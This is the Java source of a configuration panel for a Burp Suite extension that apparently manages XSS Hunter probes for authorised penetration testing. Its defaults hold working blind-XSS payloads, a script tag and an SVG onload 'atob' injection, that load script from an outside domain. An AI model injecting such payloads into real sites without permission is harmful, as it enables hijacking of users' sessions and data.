/*
 * Copyright (C) 2017 Jason Calvert
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <http://www.gnu.org/licenses/>.
 */
package burp;

import java.awt.Component;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.IOException;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.List;
import java.util.Properties;
import java.util.logging.Level;
import java.util.logging.Logger;
import javax.swing.JPanel;
import javax.swing.JTable;
import javax.swing.event.TableModelEvent;
import javax.swing.event.TableModelListener;
import javax.swing.table.DefaultTableModel;
import javax.swing.table.TableRowSorter;
import javax.swing.table.TableModel;
import javax.swing.RowSorter;
import javax.swing.SortOrder;

/**
 *
 * @author Jason Calvert
 */
public class HunterConfig extends JPanel implements ITab {

    private boolean createProbe;
    private Properties prop;
    private List<String> probes;
    private File fConfig;
    
    /**
     * Creates new form NewJPanel
     */
    public HunterConfig() {
        try {
            fConfig = new File("hunter.config");
            fConfig.createNewFile();
        } catch (IOException ex) {
            if (System.getProperty("os.name").toUpperCase().contains("WIN")) {
                fConfig = new File(System.getenv("AppData")+System.getProperty("path.separator")+"hunter.config");
            } else {
                fConfig = new File(System.getProperty("user.home")+System.getProperty("path.separator")+"hunter.config");
            }
            try {
                fConfig.createNewFile();
            } catch (IOException ex1) {
                Logger.getLogger(HunterConfig.class.getName()).log(Level.SEVERE, null, ex1);
            }
        }
        prop = new Properties();
        if (fConfig.exists()) {
            try {
                prop.load(new FileInputStream(fConfig));
            } catch (IOException ex) {
                Logger.getLogger(HunterConfig.class.getName()).log(Level.SEVERE, null, ex);
            }
        }
        
        initComponents();
    }

    /**
     * This method is called from within the constructor to initialize the form.
     * WARNING: Do NOT modify this code. The content of this method is always
     * regenerated by the Form Editor.
     */
    @SuppressWarnings("unchecked")
    // <editor-fold defaultstate="collapsed" desc="Generated Code">//GEN-BEGIN:initComponents
    private void initComponents() {

        probeDialogue = new javax.swing.JFrame();
        probeAdd = new javax.swing.JButton();
        probeCancel = new javax.swing.JButton();
        jLabel4 = new javax.swing.JLabel();
        newProbe = new javax.swing.JTextField();
        jLabel5 = new javax.swing.JLabel();
        newInject = new javax.swing.JTextField();
        jLabel6 = new javax.swing.JLabel();
        jLabel7 = new javax.swing.JLabel();
        newBase = new javax.swing.JTextField();
        jLabel8 = new javax.swing.JLabel();
        jLabel1 = new javax.swing.JLabel();
        jLabel3 = new javax.swing.JLabel();
        hunterDomain = new javax.swing.JTextField();
        jLabel2 = new javax.swing.JLabel();
        hunterKey = new javax.swing.JTextField();
        jSeparator2 = new javax.swing.JSeparator();
        addProbe = new javax.swing.JButton();
        editProbe = new javax.swing.JButton();
        copyProbe = new javax.swing.JButton();
        delProbe = new javax.swing.JButton();
        jScrollPane1 = new javax.swing.JScrollPane();
        probeTable = new javax.swing.JTable();
        jLabel9 = new javax.swing.JLabel();
        jLabel10 = new javax.swing.JLabel();

        probeDialogue.setDefaultCloseOperation(javax.swing.WindowConstants.DISPOSE_ON_CLOSE);
        probeDialogue.setTitle("Add XSS Hunter Probe");
        probeDialogue.setAlwaysOnTop(true);
        probeDialogue.setName("probeFrame"); // NOI18N
        probeDialogue.setSize(new java.awt.Dimension(600, 200));
        probeDialogue.setType(java.awt.Window.Type.UTILITY);
        probeDialogue.setLocationRelativeTo(jScrollPane1);

        probeAdd.setText("OK");
        probeAdd.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                probeAdd(evt);
            }
        });

        probeCancel.setText("Cancel");
        probeCancel.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                cancelProbe(evt);
            }
        });

        jLabel4.setText("XSS Replacement Probe:");

        jLabel5.setText("Injection:");

        jLabel6.setText("Create a probe variable and the corresponding injection request.");

        jLabel7.setText("Base64 String:");

        jLabel8.setText("Use [DOMAIN] to specify where src location and use [BASE64] to inject Base64 String if needed. ");

        javax.swing.GroupLayout probeDialogueLayout = new javax.swing.GroupLayout(probeDialogue.getContentPane());
        probeDialogue.getContentPane().setLayout(probeDialogueLayout);
        probeDialogueLayout.setHorizontalGroup(
            probeDialogueLayout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addGroup(probeDialogueLayout.createSequentialGroup()
                .addContainerGap()
                .addGroup(probeDialogueLayout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
                    .addGroup(probeDialogueLayout.createSequentialGroup()
                        .addComponent(jLabel5)
                        .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED)
                        .addComponent(newInject))
                    .addGroup(javax.swing.GroupLayout.Alignment.TRAILING, probeDialogueLayout.createSequentialGroup()
                        .addGap(0, 0, Short.MAX_VALUE)
                        .addComponent(probeAdd)
                        .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED)
                        .addComponent(probeCancel))
                    .addGroup(probeDialogueLayout.createSequentialGroup()
                        .addComponent(jLabel7)
                        .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED)
                        .addComponent(newBase))
                    .addGroup(probeDialogueLayout.createSequentialGroup()
                        .addGroup(probeDialogueLayout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
                            .addComponent(jLabel6)
                            .addComponent(jLabel8))
                        .addGap(0, 28, Short.MAX_VALUE))
                    .addGroup(probeDialogueLayout.createSequentialGroup()
                        .addComponent(jLabel4)
                        .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED)
                        .addComponent(newProbe)))
                .addContainerGap())
        );
        probeDialogueLayout.setVerticalGroup(
            probeDialogueLayout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addGroup(javax.swing.GroupLayout.Alignment.TRAILING, probeDialogueLayout.createSequentialGroup()
                .addGap(11, 11, 11)
                .addComponent(jLabel6, javax.swing.GroupLayout.PREFERRED_SIZE, 16, javax.swing.GroupLayout.PREFERRED_SIZE)
                .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED)
                .addComponent(jLabel8)
                .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED, 28, Short.MAX_VALUE)
                .addGroup(probeDialogueLayout.createParallelGroup(javax.swing.GroupLayout.Alignment.BASELINE)
                    .addComponent(jLabel4, javax.swing.GroupLayout.PREFERRED_SIZE, 26, javax.swing.GroupLayout.PREFERRED_SIZE)
                    .addComponent(newProbe, javax.swing.GroupLayout.PREFERRED_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.PREFERRED_SIZE))
                .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED)
                .addGroup(probeDialogueLayout.createParallelGroup(javax.swing.GroupLayout.Alignment.BASELINE)
                    .addComponent(jLabel7)
                    .addComponent(newBase, javax.swing.GroupLayout.PREFERRED_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.PREFERRED_SIZE))
                .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED)
                .addGroup(probeDialogueLayout.createParallelGroup(javax.swing.GroupLayout.Alignment.BASELINE)
                    .addComponent(newInject, javax.swing.GroupLayout.PREFERRED_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.PREFERRED_SIZE)
                    .addComponent(jLabel5))
                .addGap(4, 4, 4)
                .addGroup(probeDialogueLayout.createParallelGroup(javax.swing.GroupLayout.Alignment.BASELINE)
                    .addComponent(probeAdd)
                    .addComponent(probeCancel))
                .addGap(18, 18, 18))
        );

        jLabel1.setFont(new java.awt.Font("Lucida Grande", 1, 14)); // NOI18N
        jLabel1.setForeground(new java.awt.Color(216, 140, 0));
        jLabel1.setText("XSS Hunter Configs");

        jLabel3.setText("XSS Hunter Domain:");

        hunterDomain.setToolTipText("");
        hunterDomain.addFocusListener(new java.awt.event.FocusAdapter() {
            public void focusLost(java.awt.event.FocusEvent evt) {
                hunterDomainFocusLost(evt);
            }
        });

        jLabel2.setText("Correlation Key:");

        hunterKey.addFocusListener(new java.awt.event.FocusAdapter() {
            public void focusLost(java.awt.event.FocusEvent evt) {
                hunterKeyFocusLost(evt);
            }
        });

        addProbe.setText("Add");
        addProbe.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                addProbeAction(evt);
            }
        });

        editProbe.setText("Edit");
        editProbe.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                editProbeAction(evt);
            }
        });

        copyProbe.setText("Copy");
        copyProbe.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                copyProbeAction(evt);
            }
        });

        delProbe.setText("Remove");
        delProbe.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                delProbeAction(evt);
            }
        });

        probeTable.setModel(new DefaultTableModel(new Object [][] {},
            new String [] {"Enabled", "Probe Variable", "Payload", "Base64 Injection"}) {
            Class[] types = new Class [] {
                java.lang.Boolean.class, java.lang.String.class, java.lang.String.class, java.lang.String.class
            };
            public Class getColumnClass(int columnIndex) {
                return types [columnIndex];
            }
            public boolean isCellEditable(int rowIndex, int columnIndex) {
                if (columnIndex == 0) return true;
                else return false;
            }
        });
        probeTable.setAutoResizeMode(javax.swing.JTable.AUTO_RESIZE_ALL_COLUMNS);
        probeTable.getColumnModel().getColumn(0).setMaxWidth(52);
        probeTable.getColumnModel().getColumn(1).setMinWidth(100);
        probeTable.getColumnModel().getColumn(1).setMaxWidth(150);
        DefaultTableModel model = (DefaultTableModel) probeTable.getModel();

        TableRowSorter<TableModel> sorter = new TableRowSorter<TableModel>(model);
        probeTable.setRowSorter(sorter);
        List<RowSorter.SortKey> sortKeys = new ArrayList<>(25);
        sortKeys.add(new RowSorter.SortKey(1, SortOrder.ASCENDING));
        sorter.setSortKeys(sortKeys);

        if (prop.containsKey("probes")) {
            probes = new ArrayList<String>(Arrays.asList(prop.getProperty("probes").replace(" ", "").replace("[", "").replace("]", "").split(",")));
            for (String probe : probes) {
                model.addRow(new Object[]{Boolean.parseBoolean(prop.getProperty("probe["+probe+"][enabled]")), probe, prop.getProperty("probe["+probe+"][inject]"), prop.getProperty("probe["+probe+"][base64]")});
            }
        } else {
            probes = new ArrayList<String>(Arrays.asList("alpha", "beta"));
            prop.setProperty("probes", "[alpha, beta]");
            String alphaInject = "\"><script%20src=https://[DOMAIN]></script>";
            String betaBase = "<script src=https://[DOMAIN]></script>";
            String betaInject = "<svg/onload=document.write(atob(this.id))%20id=[BASE64]>";
            model.addRow(new Object[]{true, "alpha", alphaInject, ""});
            prop.setProperty("probe[alpha][enabled]", "true");
            prop.setProperty("probe[alpha][base64]", "");
            prop.setProperty("probe[alpha][inject]", alphaInject);
            model.addRow(new Object[]{true, "beta", betaInject, betaBase});
            prop.setProperty("probe[beta][enabled]", "true");
            prop.setProperty("probe[beta][base64]", betaBase);
            prop.setProperty("probe[beta][inject]", betaInject);
        }
        if (fConfig.exists()) {
            try {
                prop.store(new FileOutputStream(fConfig), null);
            } catch (FileNotFoundException ex) {
                Logger.getLogger(HunterConfig.class.getName()).log(Level.SEVERE, null, ex);
            } catch (IOException ex) {
                Logger.getLogger(HunterConfig.class.getName()).log(Level.SEVERE, null, ex);
            }
        }

        model.addTableModelListener(new TableModelListener() {

            @Override
            public void tableChanged(TableModelEvent e) {
                if (e.getColumn() == 0 && e.getType() == TableModelEvent.UPDATE) {
                    if (Boolean.valueOf(probeTable.getValueAt(e.getFirstRow(), 0).toString()))
                    prop.setProperty("probe["+probeTable.getValueAt(e.getFirstRow(), 1).toString()+"][enabled]", "true");
                    else
                    prop.setProperty("probe["+probeTable.getValueAt(e.getFirstRow(), 1).toString()+"][enabled]", "false");
                    if (fConfig.exists()) {
                        try {
                            prop.store(new FileOutputStream(fConfig), null);
                        } catch (FileNotFoundException ex) {
                            Logger.getLogger(HunterConfig.class.getName()).log(Level.SEVERE, null, ex);
                        } catch (IOException ex) {
                            Logger.getLogger(HunterConfig.class.getName()).log(Level.SEVERE, null, ex);
                        }
                    }
                }
            }
        });
        jScrollPane1.setViewportView(probeTable);

        jLabel9.setText("Input your XSS Hunter Domain & Correlation Key.");

        jLabel10.setText("Injections will only be executed on hosts listed as in-scope.");

        javax.swing.GroupLayout layout = new javax.swing.GroupLayout(this);
        this.setLayout(layout);
        layout.setHorizontalGroup(
            layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addGroup(layout.createSequentialGroup()
                .addGroup(layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
                    .addGroup(javax.swing.GroupLayout.Alignment.TRAILING, layout.createSequentialGroup()
                        .addContainerGap()
                        .addComponent(jSeparator2))
                    .addGroup(layout.createSequentialGroup()
                        .addContainerGap()
                        .addGroup(layout.createParallelGroup(javax.swing.GroupLayout.Alignment.TRAILING, false)
                            .addComponent(editProbe, javax.swing.GroupLayout.Alignment.LEADING, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE)
                            .addComponent(delProbe, javax.swing.GroupLayout.Alignment.LEADING, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE)
                            .addComponent(addProbe, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE)
                            .addComponent(copyProbe, javax.swing.GroupLayout.Alignment.LEADING, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE))
                        .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED)
                        .addComponent(jScrollPane1, javax.swing.GroupLayout.DEFAULT_SIZE, 473, Short.MAX_VALUE))
                    .addGroup(layout.createSequentialGroup()
                        .addGap(12, 12, 12)
                        .addGroup(layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
                            .addGroup(layout.createSequentialGroup()
                                .addGroup(layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
                                    .addComponent(jLabel9)
                                    .addComponent(jLabel1)
                                    .addComponent(jLabel10))
                                .addGap(0, 0, Short.MAX_VALUE))
                            .addGroup(layout.createSequentialGroup()
                                .addGroup(layout.createParallelGroup(javax.swing.GroupLayout.Alignment.TRAILING)
                                    .addComponent(jLabel2, javax.swing.GroupLayout.PREFERRED_SIZE, 100, javax.swing.GroupLayout.PREFERRED_SIZE)
                                    .addComponent(jLabel3))
                                .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED)
                                .addGroup(layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
                                    .addComponent(hunterDomain)
                                    .addComponent(hunterKey))))))
                .addContainerGap())
        );
        layout.setVerticalGroup(
            layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addGroup(layout.createSequentialGroup()
                .addGap(15, 15, 15)
                .addComponent(jLabel1)
                .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.UNRELATED)
                .addComponent(jLabel9)
                .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED)
                .addComponent(jLabel10)
                .addGap(24, 24, 24)
                .addGroup(layout.createParallelGroup(javax.swing.GroupLayout.Alignment.BASELINE)
                    .addComponent(jLabel3)
                    .addComponent(hunterDomain, javax.swing.GroupLayout.PREFERRED_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.PREFERRED_SIZE))
                .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED)
                .addGroup(layout.createParallelGroup(javax.swing.GroupLayout.Alignment.BASELINE)
                    .addComponent(jLabel2)
                    .addComponent(hunterKey, javax.swing.GroupLayout.PREFERRED_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.PREFERRED_SIZE))
                .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.UNRELATED)
                .addComponent(jSeparator2, javax.swing.GroupLayout.PREFERRED_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.PREFERRED_SIZE)
                .addGap(18, 18, 18)
                .addGroup(layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
                    .addGroup(layout.createSequentialGroup()
                        .addComponent(addProbe)
                        .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED)
                        .addComponent(editProbe)
                        .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED)
                        .addComponent(copyProbe)
                        .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED)
                        .addComponent(delProbe)
                        .addGap(0, 0, Short.MAX_VALUE))
                    .addComponent(jScrollPane1, javax.swing.GroupLayout.DEFAULT_SIZE, 325, Short.MAX_VALUE))
                .addContainerGap())
        );

        hunterDomain.setText(prop.getProperty("domain"));
        hunterKey.setText(prop.getProperty("key"));
    }// </editor-fold>//GEN-END:initComponents

    private void cancelProbe(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_cancelProbe
        newProbe.setText("");
        newInject.setText("");
        newBase.setText("");
        probeDialogue.dispose();
    }//GEN-LAST:event_cancelProbe

    private void addProbeAction(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_addProbeAction
        probeDialogue.setVisible(true);
        probeDialogue.setTitle("Add XSS Hunter Probe");
        createProbe = true;
    }//GEN-LAST:event_addProbeAction

    private void probeAdd(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_probeAdd
        int select = probeTable.getSelectedRow();
        DefaultTableModel model = (DefaultTableModel) probeTable.getModel();
        String probe = newProbe.getText();
        if (createProbe) {
            model.addRow(new Object[]{true, probe, newInject.getText(), newBase.getText()});
        } else {
            String oldProbe = probeTable.getValueAt(probeTable.getSelectedRow(), 1).toString();
            probes.remove(oldProbe);
            prop.remove("probe["+oldProbe+"][enabled]");
            prop.remove("probe["+oldProbe+"][base64]");
            prop.remove("probe["+oldProbe+"][inject]");
            model.setValueAt(true, probeTable.convertRowIndexToModel(select), 0);
            model.setValueAt(probe, probeTable.convertRowIndexToModel(select), 1);
            model.setValueAt(newInject.getText(), probeTable.convertRowIndexToModel(select), 2);            
            model.setValueAt(newBase.getText(), probeTable.convertRowIndexToModel(select), 3);            
        }
        probes.add(probe);
        prop.setProperty("probes", probes.toString());
        prop.setProperty("probe["+probe+"][enabled]", "true");
        prop.setProperty("probe["+probe+"][base64]", newBase.getText());
        prop.setProperty("probe["+probe+"][inject]", newInject.getText());

        if (fConfig.exists()) {
            try {
                prop.store(new FileOutputStream(fConfig), null);
            } catch (FileNotFoundException ex) {
                Logger.getLogger(HunterConfig.class.getName()).log(Level.SEVERE, null, ex);
            } catch (IOException ex) {
                Logger.getLogger(HunterConfig.class.getName()).log(Level.SEVERE, null, ex);
            }
        }
        newProbe.setText("");
        newInject.setText("");
        newBase.setText("");
        probeDialogue.dispose();
    }//GEN-LAST:event_probeAdd

    private void editProbeAction(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_editProbeAction
        int select = probeTable.getSelectedRow();
        if (select != -1) {
            createProbe = false;
            probeDialogue.setVisible(true);
            probeDialogue.setTitle("Edit XSS Hunter Probe");
            newProbe.setText(probeTable.getValueAt(select, 1).toString());
            newBase.setText(probeTable.getValueAt(select, 3).toString());
            newInject.setText(probeTable.getValueAt(select, 2).toString());
        }
    }//GEN-LAST:event_editProbeAction

    private void copyProbeAction(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_copyProbeAction
        int select = probeTable.getSelectedRow();
        if (select != -1) {
            createProbe = true;
            probeDialogue.setVisible(true);
            probeDialogue.setTitle("Edit XSS Hunter Probe");
            newProbe.setText(probeTable.getValueAt(select, 1).toString()+"(1)");
            newBase.setText(probeTable.getValueAt(select, 3).toString());
            newInject.setText(probeTable.getValueAt(select, 2).toString());
        }
    }//GEN-LAST:event_copyProbeAction

    private void delProbeAction(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_delProbeAction
        int select = probeTable.getSelectedRow();
        String probe = probeTable.getValueAt(select, 1).toString();
        DefaultTableModel model = (DefaultTableModel) probeTable.getModel();
        model.removeRow(probeTable.convertRowIndexToModel(select));
        probes.remove(probe);
        prop.setProperty("probes", probes.toString());
        prop.remove("probe["+probe+"][enabled]");
        prop.remove("probe["+probe+"][base64]");
        prop.remove("probe["+probe+"][inject]");
        if (fConfig.exists()) {
            try {
                prop.store(new FileOutputStream(fConfig), null);
            } catch (FileNotFoundException ex) {
                Logger.getLogger(HunterConfig.class.getName()).log(Level.SEVERE, null, ex);
            } catch (IOException ex) {
                Logger.getLogger(HunterConfig.class.getName()).log(Level.SEVERE, null, ex);
            }
        }
    }//GEN-LAST:event_delProbeAction

    private void hunterDomainFocusLost(java.awt.event.FocusEvent evt) {//GEN-FIRST:event_hunterDomainFocusLost
        prop.setProperty("domain", hunterDomain.getText());
        if (fConfig.exists()) {
            try {
                prop.store(new FileOutputStream(fConfig), null);
            } catch (FileNotFoundException ex) {
                Logger.getLogger(HunterConfig.class.getName()).log(Level.SEVERE, null, ex);
           } catch (IOException ex) {
                Logger.getLogger(HunterConfig.class.getName()).log(Level.SEVERE, null, ex);
            }
        }
    }//GEN-LAST:event_hunterDomainFocusLost

    private void hunterKeyFocusLost(java.awt.event.FocusEvent evt) {//GEN-FIRST:event_hunterKeyFocusLost
        prop.setProperty("key", hunterKey.getText());
        if (fConfig.exists()) {
            try {
                prop.store(new FileOutputStream(fConfig), null);
            } catch (FileNotFoundException ex) {
                Logger.getLogger(HunterConfig.class.getName()).log(Level.SEVERE, null, ex);
            } catch (IOException ex) {
                Logger.getLogger(HunterConfig.class.getName()).log(Level.SEVERE, null, ex);
            }
        }
    }//GEN-LAST:event_hunterKeyFocusLost

    // Variables declaration - do not modify//GEN-BEGIN:variables
    private javax.swing.JButton addProbe;
    private javax.swing.JButton copyProbe;
    private javax.swing.JButton delProbe;
    private javax.swing.JButton editProbe;
    private javax.swing.JTextField hunterDomain;
    private javax.swing.JTextField hunterKey;
    private javax.swing.JLabel jLabel1;
    private javax.swing.JLabel jLabel10;
    private javax.swing.JLabel jLabel2;
    private javax.swing.JLabel jLabel3;
    private javax.swing.JLabel jLabel4;
    private javax.swing.JLabel jLabel5;
    private javax.swing.JLabel jLabel6;
    private javax.swing.JLabel jLabel7;
    private javax.swing.JLabel jLabel8;
    private javax.swing.JLabel jLabel9;
    private javax.swing.JScrollPane jScrollPane1;
    private javax.swing.JSeparator jSeparator2;
    private javax.swing.JTextField newBase;
    private javax.swing.JTextField newInject;
    private javax.swing.JTextField newProbe;
    private javax.swing.JButton probeAdd;
    private javax.swing.JButton probeCancel;
    private javax.swing.JFrame probeDialogue;
    private javax.swing.JTable probeTable;
    // End of variables declaration//GEN-END:variables

    @Override
    public String getTabCaption() {
        return "Burp Hunter";
    }

    @Override
    public Component getUiComponent() {
        return this;
    }
    
    public String getDomain() {
        return hunterDomain.getText();
    }
    
    public String getKey() {
        return hunterKey.getText();
    }
    
    public JTable getProbeTable() {
        return probeTable;
    }
}
